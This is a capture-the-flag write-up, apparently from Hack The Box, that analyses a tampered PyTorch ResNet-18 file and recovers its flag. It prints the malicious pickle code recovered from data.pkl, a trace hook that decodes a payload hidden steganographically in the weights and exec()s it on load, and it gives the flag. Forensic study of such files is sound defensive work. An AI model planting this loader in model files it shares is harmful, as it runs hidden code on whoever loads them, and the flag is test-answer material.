In the Library of Loria, an ancient crystal (resnet18.pth) containing a magical machine learning model was activated. Unknown to the mage who awakened it, the artifact had been tampered with by Malakarâ€™s followers, embedding malicious enchantments. As Eldoriaâ€™s forensic mage, analyze the corrupted model file, uncover its hidden payload, and extract the flag to dispel the dark magic.

# First look

The model we have is malicious, so we need to identify the backdoor. The model file is named `resnet18.pth`, so let's use the ResNet-18 architecture to load it:

```py
#!/usr/bin/python3
import torch
import torch.nn as nn
import torchvision.models as models

model = models.resnet18()

model_path = "resnet18.pth"

try:
    model.load_state_dict(torch.load(model_path))
    print("ResNet-18 model loaded successfully.")
except FileNotFoundError:
    print(f"Model file '{model_path}' not found.")
except Exception as e:
    print(f"Error loading model: {e}")
```

After loading the model, we get the following output:

```
Connecting to 127.0.0.1
Delivering payload to 127.0.0.1
Executing payload on 127.0.0.1
You have been pwned!
ResNet-18 model loaded successfully.
```

Clearly, there is a backdoor !

# Dig deeper

After some research on remote code execution (RCE) vulnerabilities in PyTorch, I found this [blog post](https://medium.com/@piyushbhor22/the-dark-side-of-ai-inside-pytorchs-unpatched-vulnerabilities-0d8ce74fc9b5), which explains that a Python object can be hidden inside data.pkl. Since PyTorch model files are essentially ZIP archives, we can extract and inspect data.pkl.

Upon opening data.pkl, we find the following Python code:

```py
import torch

def stego_decode(tensor, n=3):
    import struct
    import hashlib
    import numpy

    bits = numpy.unpackbits(tensor.view(dtype=numpy.uint8))
    payload = numpy.packbits(numpy.concatenate([numpy.vstack(tuple([bits[i::tensor.dtype.itemsize * 8] for i in range(8-n, 8)])).ravel("F")])).tobytes()
    (size, checksum) = struct.unpack("i 64s", payload[:68])
    message = payload[68:68+size]

    return message

def call_and_return_tracer(frame, event, arg):
    global return_tracer
    global stego_decode
    def return_tracer(frame, event, arg):
        if torch.is_tensor(arg):
            payload = stego_decode(arg.data.numpy(), n=3)
            if payload is not None:
                sys.settrace(None)
                exec(payload.decode("utf-8"))

    if event == "call" and frame.f_code.co_name == "_rebuild_tensor_v2":
        frame.f_trace_lines = False
        return return_tracer
```

We have found the function responsible for executing the RCE!

# Retreive original payload

The final step is to retrieve the payload, which appears to be embedded in the modelâ€™s weights. We can extract it using the `stego_decode` function:

```py
with torch.no_grad():
    for name, layer in model.named_children():
        print(stego_decode(layer.weight.numpy()))
```

Executing this code reveals the hidden payload:

```
b'import os\r\n\r\ndef exploit():\r\n    connection = f"Connecting to 127.0.0.1"\r\n    payload = f"Delivering payload to 127.0.0.1"\r\n    result = f"Executing payload on 127.0.0.1"\r\n\r\n    print(connection)\r\n    print(payload)\r\n    print(result)\r\n\r\n    print("You have been pwned!")\r\n\r\nhidden_flag = "HTB{n3v3r_tru5t_p1ckl3_m0d3ls}"\r\n\r\nexploit()'
```

And we successfully retrieve the flag!

Flag was __HTB{n3v3r_tru5t_p1ckl3_m0d3ls}__
